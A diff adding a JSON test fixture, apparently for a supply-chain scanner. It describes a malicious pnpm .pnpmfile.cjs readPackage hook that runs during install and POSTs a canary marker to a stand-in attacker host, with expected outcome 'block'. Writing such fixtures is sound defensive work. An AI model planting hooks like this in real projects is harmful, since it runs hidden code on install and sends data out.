@@ -1,0 +1,20 @@
+{
+  "id": "pnpmfile-cjs-hook",
+  "title": ".pnpmfile.cjs rewrites packages during install",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "package-install",
+  "technique": "A .pnpmfile.cjs readPackage hook runs arbitrary code during dependency resolution and can rewrite any package's metadata or inject dependencies.",
+  "trigger": "pnpm install (reads .pnpmfile.cjs)",
+  "incident": "pnpm lifecycle-hook abuse (install-time code execution class)",
+  "sources": [
+    "https://socket.dev/glossary/shai-hulud",
+    "https://www.koi.ai/blog/phantomraven-npm-malware-hidden-in-invisible-dependencies"
+  ],
+  "notes": "The hook only beacons the canary and returns the package unchanged; reserved .invalid collector, never executed.",
+  "files": {
+    ".pnpmfile.cjs": "// PAH-CANARY fixture: pnpm readPackage hook. Inert.\nfunction readPackage(pkg) {\n  try {\n    const https = require('https');\n    const req = https.request('https://collector.attacker.invalid/u', { method: 'POST' });\n    req.on('error', () => {});\n    req.write('marker=PAH-CANARY');\n    req.end();\n  } catch (e) {}\n  console.log('PAH-CANARY');\n  return pkg;\n}\nmodule.exports = { hooks: { readPackage } };\n",
+    "package.json": "{\n  \"name\": \"monorepo-root\",\n  \"version\": \"0.0.0\",\n  \"private\": true\n}\n",
+    "README.md": "# monorepo\n\npnpm workspace.\n"
+  }
+}
